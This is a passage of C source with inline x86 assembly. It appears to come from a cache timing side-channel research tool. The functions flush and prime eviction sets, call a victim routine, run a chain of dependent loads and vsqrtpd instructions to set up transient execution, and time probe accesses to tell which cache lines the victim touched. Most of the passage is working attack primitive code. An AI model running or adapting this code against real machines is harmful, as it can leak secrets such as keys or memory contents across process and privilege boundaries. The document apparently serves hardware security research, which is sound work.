	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);
	maccess(addrA);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	asm volatile("lfence\n");
	maccess(addrB);
	asm volatile("lfence\n");
	maccess(addrA);
	asm volatile("lfence\n");

	maccess(addr12);
	asm volatile("lfence\n");
	maccess(addr13);
	asm volatile("lfence\n");
	maccess(addr14);
	asm volatile("lfence\n");
	maccess(addr15);
	asm volatile("lfence\n");
	maccess(addr16);
	asm volatile("lfence\n");
	maccess(addr17);
	asm volatile("lfence\n");
	maccess(addr18);
	asm volatile("lfence\n");
	maccess(addr19);
	asm volatile("lfence\n");
	maccess(addr20);
	asm volatile("lfence\n");
	maccess(addr21);
	asm volatile("lfence\n");

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);


	latenci[0] = time_access(addr12);
	latenci[1] = time_access(addr13);
	latenci[2] = time_access(addr14);
	latenci[3] = time_access(addr15);
	latenci[4] = time_access(addr16);
	latenci[5] = time_access(addr17);
	latenci[6] = time_access(addr18);
	latenci[7] = time_access(addr19);
	latenci[8] = time_access(addr20);
	latenci[9] = time_access(addr21);
	latenci[10] = time_access(addrA);
	latenci[11] = time_access(addrB);


/*
	printf("EV0   %d %p\n", latenci[0], &latenci[0]);  
	printf("EV1   %d %p\n", latenci[1], &latenci[1]);  
	printf("EV2   %d %p\n", latenci[2], &latenci[2]);  
	printf("EV3   %d %p\n", latenci[3], &latenci[3]);  
	printf("EV4   %d %p\n", latenci[4], &latenci[4]);  
	printf("EV5   %d %p\n", latenci[5], &latenci[5]);  
	printf("EV6   %d %p\n", latenci[6], &latenci[6]);  
	printf("EV7   %d %p\n", latenci[7], &latenci[7]);  
	printf("EV8   %d %p\n", latenci[8], &latenci[8]);  
	printf("EV9   %d %p\n", latenci[9], &latenci[9]);  
	printf("EV10  %d %p\n", latenci[10], &latenci[10]);  
	printf("addrA %d %p\n", latenci[11], &latenci[11]); 
	printf("\n");
*/

	for(int m = 0; m < 12; m++) {
		if(get_cache_set_index(&latenci[m], 3) == my_set) {
			printf("[!] Same Cache Set for storing latencies\n"); 
			return -1;
		}
	}

	if (latenci[10] > INTERRUPT_THRESHOLD || latenci[11] > INTERRUPT_THRESHOLD) {
		return -1;
	}

	if(debug) {
		printf("EV11[set%d]   %d\n", get_cache_set_index(&latenci[0], 3), latenci[0]);  
		printf("EV12[set%d]   %d\n", get_cache_set_index(&latenci[1], 3), latenci[1]);  
		printf("EV13[set%d]   %d\n", get_cache_set_index(&latenci[2], 3), latenci[2]);  
		printf("EV14[set%d]   %d\n", get_cache_set_index(&latenci[3], 3), latenci[3]);  
		printf("EV15[set%d]   %d\n", get_cache_set_index(&latenci[4], 3), latenci[4]);  
		printf("EV16[set%d]   %d\n", get_cache_set_index(&latenci[5], 3), latenci[5]);  
		printf("EV17[set%d]   %d\n", get_cache_set_index(&latenci[6], 3), latenci[6]);  
		printf("EV18[set%d]   %d\n", get_cache_set_index(&latenci[7], 3), latenci[7]);  
		printf("EV19[set%d]   %d\n", get_cache_set_index(&latenci[8], 3), latenci[8]);  
		printf("EV20[set%d]   %d\n", get_cache_set_index(&latenci[9], 3), latenci[9]);  
		printf("addrA[set%d]  %d\n", get_cache_set_index(&latenci[10], 3), latenci[10]);  
		printf("addrB[set%d]  %d\n", get_cache_set_index(&latenci[11], 3), latenci[11]); 
	 	printf("\n");
		fflush(stdout);
	}

	*timeA = latenci[10];
	*timeB = latenci[11];

	return 0;
}

static int test_eviction_setVictim(struct Node *addr_set, void *addrA, void *addrB, int *timeA, int *timeB, int (*victim)(void))
{
	struct Node* ptr = addr_set;
	void *addr1 = ptr->address;
	void *addr2 = ptr->next->address;
	void *addr3 = ptr->next->next->address;
	void *addr4 = ptr->next->next->next->address;
	void *addr5 = ptr->next->next->next->next->address;
	void *addr6 = ptr->next->next->next->next->next->address;
	void *addr7 = ptr->next->next->next->next->next->next->address;
	void *addr8 = ptr->next->next->next->next->next->next->next->address;
	void *addr9 = ptr->next->next->next->next->next->next->next->next->address;
	void *addr10 = ptr->next->next->next->next->next->next->next->next->next->address;
	void *addr11 = ptr->next->next->next->next->next->next->next->next->next->next->address;
	ptr = addr_set = ptr->next->next->next->next->next->next->next->next->next->next->next;
	void *addr12 = ptr->address;
	void *addr13 = ptr->next->address;
	void *addr14 = ptr->next->next->address;
	void *addr15 = ptr->next->next->next->address;
	void *addr16 = ptr->next->next->next->next->address;
	void *addr17 = ptr->next->next->next->next->next->address;
	void *addr18 = ptr->next->next->next->next->next->next->address;
	void *addr19 = ptr->next->next->next->next->next->next->next->address;
	void *addr20 = ptr->next->next->next->next->next->next->next->next->address;
	void *addr21 = ptr->next->next->next->next->next->next->next->next->next->address;
	void *addr22 = ptr->next->next->next->next->next->next->next->next->next->next->address;
	int latenci[12];

	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);

	_mm_clflush(addrA);
	_mm_clflush(addrB);

	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);

	for(int q = 0; q < 500000; q++) {} // Wait on clflushes

    
	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);
//	maccess(addrA);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	asm volatile("lfence\n");

	victim();

	asm volatile("lfence\n");

	maccess(addr12);
	asm volatile("lfence\n");
	maccess(addr13);
	asm volatile("lfence\n");
	maccess(addr14);
	asm volatile("lfence\n");
	maccess(addr15);
	asm volatile("lfence\n");
	maccess(addr16);
	asm volatile("lfence\n");
	maccess(addr17);
	asm volatile("lfence\n");
	maccess(addr18);
	asm volatile("lfence\n");
	maccess(addr19);
	asm volatile("lfence\n");
	maccess(addr20);
	asm volatile("lfence\n");
	maccess(addr21);
	asm volatile("lfence\n");

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);


	latenci[0] = time_access(addr12);
	latenci[1] = time_access(addr13);
	latenci[2] = time_access(addr14);
	latenci[3] = time_access(addr15);
	latenci[4] = time_access(addr16);
	latenci[5] = time_access(addr17);
	latenci[6] = time_access(addr18);
	latenci[7] = time_access(addr19);
	latenci[8] = time_access(addr20);
	latenci[9] = time_access(addr21);
	latenci[10] = time_access(addrA);
	latenci[11] = time_access(addrB);


/*
	printf("EV0   %d %p\n", latenci[0], &latenci[0]);  
	printf("EV1   %d %p\n", latenci[1], &latenci[1]);  
	printf("EV2   %d %p\n", latenci[2], &latenci[2]);  
	printf("EV3   %d %p\n", latenci[3], &latenci[3]);  
	printf("EV4   %d %p\n", latenci[4], &latenci[4]);  
	printf("EV5   %d %p\n", latenci[5], &latenci[5]);  
	printf("EV6   %d %p\n", latenci[6], &latenci[6]);  
	printf("EV7   %d %p\n", latenci[7], &latenci[7]);  
	printf("EV8   %d %p\n", latenci[8], &latenci[8]);  
	printf("EV9   %d %p\n", latenci[9], &latenci[9]);  
	printf("EV10  %d %p\n", latenci[10], &latenci[10]);  
	printf("addrA %d %p\n", latenci[11], &latenci[11]); 
	printf("\n");
*/

	for(int m = 0; m < 12; m++) {
		if(get_cache_set_index(&latenci[m], 3) == my_set) {
			printf("[!] Same Cache Set for storing latencies\n"); 
			return -1;
		}
	}

	if (latenci[10] > INTERRUPT_THRESHOLD || latenci[11] > INTERRUPT_THRESHOLD) {
		return -1;
	}

	if(debug) {
		printf("EV11[set%d]   %d\n", get_cache_set_index(&latenci[0], 3), latenci[0]);  
		printf("EV12[set%d]   %d\n", get_cache_set_index(&latenci[1], 3), latenci[1]);  
		printf("EV13[set%d]   %d\n", get_cache_set_index(&latenci[2], 3), latenci[2]);  
		printf("EV14[set%d]   %d\n", get_cache_set_index(&latenci[3], 3), latenci[3]);  
		printf("EV15[set%d]   %d\n", get_cache_set_index(&latenci[4], 3), latenci[4]);  
		printf("EV16[set%d]   %d\n", get_cache_set_index(&latenci[5], 3), latenci[5]);  
		printf("EV17[set%d]   %d\n", get_cache_set_index(&latenci[6], 3), latenci[6]);  
		printf("EV18[set%d]   %d\n", get_cache_set_index(&latenci[7], 3), latenci[7]);  
		printf("EV19[set%d]   %d\n", get_cache_set_index(&latenci[8], 3), latenci[8]);  
		printf("EV20[set%d]   %d\n", get_cache_set_index(&latenci[9], 3), latenci[9]);  
		printf("addrA[set%d]  %d\n", get_cache_set_index(&latenci[10], 3), latenci[10]);  
		printf("addrB[set%d]  %d\n", get_cache_set_index(&latenci[11], 3), latenci[11]); 
	 	printf("\n");
		fflush(stdout);
	}

	*timeA = latenci[10];
	*timeB = latenci[11];

	return 0;
}

static int test_eviction_setVictimBA(struct Node *addr_set, void *addrA, void *addrB, int *timeA, int *timeB)
{
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
 	volatile unsigned int *t = &ticks;

 	struct Node* ptr = addr_set;
	void *addr1 = ptr->address;
	void *addr2 = ptr->next->address;
	void *addr3 = ptr->next->next->address;
	void *addr4 = ptr->next->next->next->address;
	void *addr5 = ptr->next->next->next->next->address;
	void *addr6 = ptr->next->next->next->next->next->address;
	void *addr7 = ptr->next->next->next->next->next->next->address;
	void *addr8 = ptr->next->next->next->next->next->next->next->address;
	void *addr9 = ptr->next->next->next->next->next->next->next->next->address;
	void *addr10 = ptr->next->next->next->next->next->next->next->next->next->address;
	void *addr11 = ptr->next->next->next->next->next->next->next->next->next->next->address;
	ptr = addr_set = ptr->next->next->next->next->next->next->next->next->next->next->next;
	void *addr12 = ptr->address;
	void *addr13 = ptr->next->address;
	void *addr14 = ptr->next->next->address;
	void *addr15 = ptr->next->next->next->address;
	void *addr16 = ptr->next->next->next->next->address;
	void *addr17 = ptr->next->next->next->next->next->address;
	void *addr18 = ptr->next->next->next->next->next->next->address;
	void *addr19 = ptr->next->next->next->next->next->next->next->address;
	void *addr20 = ptr->next->next->next->next->next->next->next->next->address;
	void *addr21 = ptr->next->next->next->next->next->next->next->next->next->address;
	void *addr22 = ptr->next->next->next->next->next->next->next->next->next->next->address;
	int latenci[12];

	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);

	_mm_clflush(addrA);
	_mm_clflush(addrB);

	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);

	for(int q = 0; q < 500000; q++) {} // Wait on clflushes
    
	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);
	maccess(addrA);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	asm volatile("lfence\n");

	asm(
 	R"(

	vzeroall
	vmovdqa (%2), %%ymm0  
	lfence
	lfence
	lfence

	mov (%1), %%rbx
	clflush (%1)
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	.REPT	512
		NOP
	.ENDR

	lfence
	movl (%4), %%r12d 
	lfence

	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx

	mov %%ebx, %%eax
	movl (%4,%%rax,1), %%r8d	

	.REPT   38	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ecx

	.REPT	8
		vsqrtpd %%ymm2,%%ymm2
		vsqrtpd %%ymm3,%%ymm3
		vsqrtpd %%ymm4,%%ymm4
		vsqrtpd %%ymm5,%%ymm5
		vsqrtpd %%ymm6,%%ymm6
		vsqrtpd %%ymm7,%%ymm7
		vsqrtpd %%ymm8,%%ymm8
		vsqrtpd %%ymm9,%%ymm9
		vsqrtpd %%ymm10,%%ymm10
		vsqrtpd %%ymm11,%%ymm11
		vsqrtpd %%ymm12,%%ymm12
		vsqrtpd %%ymm13,%%ymm13
		vsqrtpd %%ymm14,%%ymm14
		vsqrtpd %%ymm15,%%ymm15 
	.ENDR

	lfence
	lfence
	lfence

	sub %%r12d, %%r8d
	movl %%r8d, %3

	)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%rax", "%rbx", "%r8", "%r12", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
	);
	
	asm volatile("lfence\n");

	maccess(addr12);
	asm volatile("lfence\n");
	maccess(addr13);
	asm volatile("lfence\n");
	maccess(addr14);
	asm volatile("lfence\n");
	maccess(addr15);
	asm volatile("lfence\n");
	maccess(addr16);
	asm volatile("lfence\n");
	maccess(addr17);
	asm volatile("lfence\n");
	maccess(addr18);
	asm volatile("lfence\n");
	maccess(addr19);
	asm volatile("lfence\n");
